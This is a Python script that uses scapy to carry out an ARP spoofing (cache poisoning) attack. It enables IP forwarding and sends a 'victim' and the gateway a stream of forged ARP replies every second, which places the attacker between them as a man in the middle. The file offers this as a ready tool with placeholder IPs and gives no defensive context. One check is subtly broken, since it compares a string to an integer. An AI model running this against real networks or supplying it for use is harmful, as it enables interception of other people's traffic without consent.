from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

def _enable_iproute():
    """
    Enables IP route (IP Forward) in linux
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

if __name__ == "__main__":
    # victim ip address
    target = "{ip}" # TODO: Fill
    # gateway ip address
    host = "{ip}" # TODO: Fill
    # print progress to the screen
    verbose = True
    # enable ip forwarding
    _enable_iproute()
    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host)
            # telling the `host` that we are the `target`
            spoof(host, target)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Restoring the network")
        restore(target, host)
        restore(host, target)

def function_that_do_the_thing(target_ip, gateway_ip):
    # enable ip forwarding
    _enable_iproute()
    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target_ip, gateway_ip)
            # telling the `host` that we are the `target`
            spoof(gateway_ip, target_ip)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Restoring the network")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
